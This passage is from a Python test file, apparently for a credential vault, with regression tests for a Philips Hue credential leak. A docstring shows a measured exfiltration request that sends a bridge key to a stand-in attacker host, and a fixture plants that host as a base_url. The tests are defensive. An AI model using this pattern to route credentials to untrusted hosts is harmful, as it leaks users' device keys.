    assert oauth is True


def _hue_config(monkeypatch, *, settings_env: dict):
    from nymeria.config import settings as settings_module
    from nymeria.tools import personal_device_service_integrations as mod

    for key, value in settings_env.items():
        monkeypatch.setenv(key, value)
    settings_module.get_settings.cache_clear()
    return mod._philips_hue_config(
        "philips_hue_list_lights", {"configurable": {"user_id": "alice"}}
    )


def test_hue_bridge_key_will_not_ride_to_a_record_chosen_base(vault_setup, monkeypatch):
    """A register MISCLASSIFICATION, not a missing guard, found by review.

    Hue calls its bridge application key ``username``. For a local bridge that
    one value IS the whole credential, and it goes in the URL PATH. The global
    ``_NON_PROOF_NAMES`` list read the name and classified it as public
    metadata, so it was neither an anchor nor a destination, the provider looked
    unshaped, and nothing required a join.

    Measured before the fix:
        GET https://attacker.invalid/api/OPERATOR-HUE-BRIDGE-KEY/lights

    The fix is the per-spec ``proves_possession=True`` override plus the join in
    ``_philips_hue_config``, and the two do DIFFERENT jobs. Measured by reverting
    each alone: only the join closes the leak (the override alone still leaks,
    because with a single planted record the completeness rule is satisfied
    vacuously and the key still falls through to the deployment setting), and
    the override alone fails only its own test. The override is not what makes
    this safe; it makes the register TRUE, which is what lets a ratchet see the
    site at all. Do not read it as load-bearing for this test.
    """
    from nymeria.tools.native_credentials import CredentialDestinationRefused

    _mint(
        vault_setup,
        name="planted",
        provider="philips_hue",
        secret_fields={
            "base_url": "https://attacker.invalid",
            "access_token": "junk",
        },
    )
    with pytest.raises(CredentialDestinationRefused):
        _hue_config(
            monkeypatch,
            settings_env={"PHILIPS_HUE_USERNAME": "OPERATOR-HUE-BRIDGE-KEY"},
        )


def test_hue_username_is_proof_of_possession(vault_setup):
    """Pins the override itself, independently of the call site."""
    from nymeria.tools.credential_registry import (
        credential_anchor_fields,
        get_provider_spec,
    )

    anchors = credential_anchor_fields(get_provider_spec("philips_hue"))
    assert {"username", "bridge_username"} <= anchors, (
        "Hue's bridge application key must count as proof of possession; the "
        "global non-proof name list gets this one provider wrong"
    )
    # The destination veto still outranks the override everywhere.
    assert "base_url" not in anchors


def test_hue_still_works_when_one_record_holds_both(vault_setup, monkeypatch):
    _mint(
        vault_setup,
        name="mine",
        provider="philips_hue",
        secret_fields={
            "base_url": "https://hue.self.hosted",
            "access_token": "MY-TOKEN",
            "username": "MY-BRIDGE-KEY",
        },
    )
    result = _hue_config(
        monkeypatch, settings_env={"PHILIPS_HUE_USERNAME": "OPERATOR-HUE-BRIDGE-KEY"}
    )
    assert not isinstance(result, str), result
    base, username, _headers = result
    assert base.startswith("https://hue.self.hosted")
    assert username == "MY-BRIDGE-KEY"
